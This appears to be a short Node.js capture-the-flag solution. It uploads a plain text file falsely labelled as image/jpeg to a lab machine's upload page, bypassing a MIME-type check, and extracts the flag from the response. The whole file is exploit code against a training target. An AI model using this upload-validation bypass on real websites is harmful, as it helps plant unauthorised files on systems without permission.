require("dotenv").config();
const url = `http://10.11.100.150/index.php?page=upload`;

const fileInput = new File(["file content"], "file.txt", {
  type: "image/jpeg",
});
const formData = new FormData();

formData.append("uploaded", fileInput);
formData.append("Upload", "Upload");

fetch(url, {
  method: "POST",
  body: formData,
})
  .then((response) => response.text())
  .then((text) => {
    const flagStart = text.indexOf("flag") + 10;
    const flag = text.substring(flagStart, flagStart + 64);
    console.log(flag);
  })
  .catch((error) => {
    console.error("Error:", error);
  });
